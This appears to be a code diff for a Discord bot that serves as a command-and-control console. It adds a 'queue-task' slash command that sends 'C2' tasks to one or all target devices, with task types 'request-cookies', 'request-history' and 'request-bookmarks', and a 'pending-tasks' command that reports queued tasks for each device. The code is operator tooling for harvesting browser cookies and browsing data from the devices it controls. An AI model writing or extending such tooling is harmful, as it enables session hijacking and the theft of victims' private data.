@@ -351,8 +351,138 @@ async def set_communication_protocol(
 
 
 # ---------------------------------------------------------------------------
+# Task queue autocomplete
+# ---------------------------------------------------------------------------
+
+VALID_TASK_TYPES = [
+    "request-cookies",
+    "request-history",
+    "request-bookmarks",
+]
+
+
+async def task_type_autocomplete(
+    interaction: discord.Interaction,
+    current: str,
+) -> list[app_commands.Choice[str]]:
+    """Provide autocomplete options for task types."""
+    return [
+        app_commands.Choice(name=t, value=t)
+        for t in VALID_TASK_TYPES
+        if current == "" or t.startswith(current.lower())
+    ]
+
+
+async def device_name_autocomplete(
+    interaction: discord.Interaction,
+    current: str,
+) -> list[app_commands.Choice[str]]:
+    """Provide autocomplete options for device names (fetched from server)."""
+    choices = [app_commands.Choice(name="* (all devices)", value="*")]
+    server_response = await call_server("/admin/devices")
+    if server_response:
+        devices = server_response.get("data", {}).get("devices", [])
+        for d in devices:
+            name = d["name"]
+            if current == "" or name.startswith(current.lower()):
+                choices.append(app_commands.Choice(name=name, value=name))
+    return choices[:25]  # Discord limit
+
+
+# ---------------------------------------------------------------------------
+# Task queue commands
+# ---------------------------------------------------------------------------
+
+@bot.tree.command(
+    name="queue-task",
+    description="Queue a task for a device. Use '*' for all devices.",
+)
+@app_commands.autocomplete(device=device_name_autocomplete, task_type=task_type_autocomplete)
+@app_commands.describe(
+    device="Target device name (or '*' for all devices)",
+    task_type="Type of task to queue (request-cookies, request-history, request-bookmarks)",
+    parameters="Optional JSON parameters for the task",
+)
+async def queue_task(
+    interaction: discord.Interaction,
+    device: str,
+    task_type: str,
+    parameters: str = "{}",
+) -> None:
+    """Queue a C2 task for a target device via the server."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "queue-task")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "queue-task", f"device={device}, type={task_type}")
+
+    import json
+    try:
+        params = json.loads(parameters)
+    except json.JSONDecodeError:
+        await interaction.response.send_message(
+            "❌ Invalid JSON in parameters. Example: `{\"domains\": \"google.com\"}`",
+            ephemeral=True,
+        )
+        return
+
+    server_response = await call_server(
+        "/admin/queue-task",
+        method="POST",
+        json_body={
+            "device_name": device,
+            "task_type": task_type,
+            "parameters": params,
+        },
+    )
+    if server_response:
+        response = format_server_simple(server_response)
+    else:
+        response = "❌ Server unreachable — cannot queue tasks in standalone mode."
+
+    await interaction.response.send_message(response)
+
+
+@bot.tree.command(
+    name="pending-tasks",
+    description="Show all pending tasks across all devices.",
+)
+async def pending_tasks(interaction: discord.Interaction) -> None:
+    """Show pending task counts per device."""
+    if not is_admin_user(interaction):
+        log_access_denied(interaction, "pending-tasks")
+        await interaction.response.send_message(
+            "🚫 **Access denied.** You are not authorised to use this bot.",
+            ephemeral=True,
+        )
+        return
+
+    log_command(interaction, "pending-tasks")
+
+    server_response = await call_server("/admin/pending-tasks")
+    if server_response:
+        pending = server_response.get("data", {}).get("pending_by_device", {})
+        if not pending:
+            response = "✅ No pending tasks."
+        else:
+            lines = [f"📋 **Pending Tasks**"]
+            for dev, count in pending.items():
+                lines.append(f"  📱 **{dev}** — {count} task(s)")
+            response = "\n".join(lines)
+    else:
+        response = "❌ Server unreachable — cannot check pending tasks."
+
+    await interaction.response.send_message(response)
+
+
+# ---------------------------------------------------------------------------
 # Entry point
 # ---------------------------------------------------------------------------
 
 if __name__ == "__main__":
     bot.run(DISCORD_BOT_TOKEN)
+
